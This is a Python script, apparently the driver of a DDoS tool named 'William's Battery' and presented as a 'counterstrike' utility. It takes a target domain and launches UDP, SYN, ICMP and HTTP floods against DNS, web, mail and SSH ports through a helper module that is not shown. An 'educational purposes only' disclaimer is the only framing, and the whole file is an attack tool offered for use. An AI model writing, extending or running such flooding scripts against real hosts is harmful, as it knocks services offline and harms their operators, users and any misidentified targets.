import counter_strike_helper


def full_scale_counter_strike(target):
    print("Full Counterstrike Initiated...")
    print("Performing UDP Attack")
    counter_strike_helper.attack_UDP("UDP-Mix",target,53,360) # DNS
    counter_strike_helper.attack_UDP("UDP-Mix", target, 443, 360) # QUIC
    print("Performing SYN Flood")
    counter_strike_helper.synflood(target,80,20000000) # HTTP
    counter_strike_helper.synflood(target, 443, 20000000) # HTTPS
    counter_strike_helper.synflood(target, 25, 20000000) # Email
    counter_strike_helper.synflood(target, 587, 20000000) # Email
    counter_strike_helper.synflood(target, 465, 20000000) # Email
    counter_strike_helper.synflood(target, 143, 20000000) # Email
    counter_strike_helper.synflood(target, 993, 20000000) # Email
    counter_strike_helper.synflood(target, 22, 20000000) # SSH
    print("Performing ICMP Flood")
    counter_strike_helper.icmpflood(target,200000000) # ICMP
    print("Performing HTTP Flood")
    counter_strike_helper.attack_http_flood(target,80,3000000000) # http flood

def fast_counter_strike(target):
    print("Full Counterstrike Initiated...")
    print("Performing UDP Attack")
    counter_strike_helper.attack_UDP("UDP-Mix", target, 53, 120)  # DNS
    print("Performing SYN Flood")
    counter_strike_helper.synflood(target, 80, 10000000)  # HTTP
    counter_strike_helper.synflood(target, 443, 10000000)  # HTTPS
    counter_strike_helper.synflood(target, 25, 10000000)  # Email
    counter_strike_helper.synflood(target, 587, 10000000)  # Email
    print("Performing ICMP Flood")
    counter_strike_helper.icmpflood(target, 80000000) # ICMP
    print("Performing HTTP Flood")
    counter_strike_helper.attack_http_flood(target, 80, 1000000000) # http flood


if __name__ == "__main__":
    print("-"*60)
    print("WELCOME TO WILLIAM'S BATTERY ---- A CONVENIENT COUNTERSTRIKE TOOL")
    print("-"*60)
    print("This tool is for educational purposes only!")
    target_domain = str(input("Please Enter The Domain Name Of Your Target: "))
    print(f"Target: {target_domain}")
    options = int(input("For Full Counterstrike, Enter 1;\n"
                        "For Fast Counterstrike, Enter 2\n"
                        "Please Enter Your Options: "))
    if options == 1:
        full_scale_counter_strike(target_domain)
    elif options == 2:
        fast_counter_strike(target_domain)
